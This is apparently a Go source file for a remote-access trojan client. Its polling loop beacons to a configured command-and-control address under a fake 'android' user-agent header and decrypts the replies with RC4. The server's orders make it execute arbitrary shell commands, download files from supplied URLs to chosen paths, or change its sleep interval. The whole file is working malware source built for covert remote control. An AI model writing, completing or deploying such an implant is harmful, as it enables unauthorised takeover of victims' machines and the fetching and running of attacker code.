package core

import (
	"../config"
	"../shell"
	"../utils"
	"bytes"
	"encoding/json"
	"github.com/satori/go.uuid"
	"io/ioutil"
	"net/http"
	"strconv"
	"time"
)

type Down struct {
	Url  string `json:"url"`
	Path string `json:"path"`
}
type Shell struct {
	Command string `json:"command"`
	Param   string `json:"param"`
}
type Work struct {
	Uuid       string `json:"uuid"`
	Last       string `json:"last"`
	Result     string `json:"result"`
	User       string `json:"user"`
	Ip         string `json:"ip"`
	NextSecond string `json:"next_second"`
}
type Action struct {
	Do   string `json:"do"`
	Data string `json:"data"`
}
type Core struct {
	remoteAddress string
	remarks       string
	sleep         int
	uuid          string
	last          string
}

func (c *Core) Pool() {
	client := &http.Client{}
	for {
		time.Sleep(time.Duration(c.sleep) * time.Second)
		var result Action
		data := Work{Uuid: c.uuid, Last: "first"}
		bytesJson, _ := json.Marshal(data)
		req, _ := http.NewRequest("POST", c.remoteAddress, bytes.NewReader(bytesJson))
		req.Header.Add("UA", "android")
		resp, _ := client.Do(req)
		body, _ := ioutil.ReadAll(resp.Body)
		decode := utils.ImmediateRC4(body)
		err := json.Unmarshal(decode, &result)
		if err != nil {
			continue
		}
		switch result.Do {
		case "cmd":
			var cmd Shell
			err := json.Unmarshal([]byte(result.Data), &cmd)
			if err != nil {
				c.last = "Shel  Error."
				continue
			}
			shell.ExecuteCmd(cmd.Command, cmd.Param)
		case "download":
			var down Down
			err := json.Unmarshal([]byte(result.Data), &down)
			if err != nil {
				c.last = "Download Param Error."
				continue
			}
			shell.Download(down.Url, down.Path)
		case "update":
			// update :
		case "sleep":
			sleep, err := strconv.Atoi(result.Data)
			if err == nil {
				c.sleep = sleep
			}
		}

	}
}

func NewClient() Core {
	var u string
	u2, err := uuid.NewV4()
	if err != nil {
		u = utils.RandStringRunes(16)
	} else {
		u = u2.String()
	}

	c := Core{
		remoteAddress: config.RemoteAddres,
		remarks:       utils.GetRemarks(),
		uuid:          u,
		sleep:         config.DefaultSleep,
	}
	return c
}
